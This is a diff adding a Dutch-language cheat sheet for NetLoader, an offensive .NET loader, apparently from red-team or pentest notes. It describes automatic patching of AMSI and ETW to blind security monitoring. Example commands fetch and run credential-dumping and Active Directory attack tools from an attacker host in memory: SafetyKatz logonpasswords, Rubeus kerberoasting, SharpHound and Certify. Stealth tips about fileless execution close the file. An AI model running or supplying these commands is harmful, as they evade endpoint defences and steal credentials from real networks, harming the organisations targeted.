@@ -1,0 +1,33 @@
+# NetLoader — .NET assembly loader met ingebouwde AMSI/ETW bypass
+# Laadt .NET assemblies in-memory vanaf URL of lokaal pad, omzeilt AMSI en ETW automatisch
+#
+# === Syntax ===
+# Loader.exe -path <pad_of_url> [-args "argumenten"]
+#
+# === Belangrijkste opties ===
+# -path     Pad naar .NET assembly (lokaal bestand of HTTP URL)
+# -args     Argumenten die aan de geladen assembly worden doorgegeven
+#
+# === Werking ===
+# 1. Patcht AMSI (AmsiScanBuffer) automatisch
+# 2. Patcht ETW (EtwEventWrite) automatisch
+# 3. Downloadt of leest de assembly
+# 4. Laadt en voert de assembly uit in-memory
+#
+# === Voorbeelden ===
+# Laad tool vanaf attacker webserver:
+Loader.exe -path http://ATTACKER_IP/tools/SafetyKatz.exe -args "sekurlsa::logonpasswords"
+# Laad Rubeus vanaf URL met argumenten:
+Loader.exe -path http://ATTACKER_IP/tools/Rubeus.exe -args "kerberoast /outfile:hashes.txt"
+# Laad SharpHound vanaf URL:
+Loader.exe -path http://ATTACKER_IP/tools/SharpHound.exe -args "-c All"
+# Laad lokaal bestand:
+Loader.exe -path c:\windows\tasks\Seatbelt.exe -args "-group=all"
+# Laad Certify:
+Loader.exe -path http://ATTACKER_IP/tools/Certify.exe -args "find /vulnerable"
+#
+# Tip: Geen aparte AMSI/ETW bypass nodig — zit ingebouwd
+# Tip: Assembly wordt nooit naar disk geschreven (fileless)
+# Tip: Ideaal om vanuit een Invisi-Shell of CLM-bypass sessie te draaien
+# Tip: Werkt alleen met .NET assemblies (niet met native PE's)
+# Tip: Combineer met Invisi-Shell voor maximale stealth
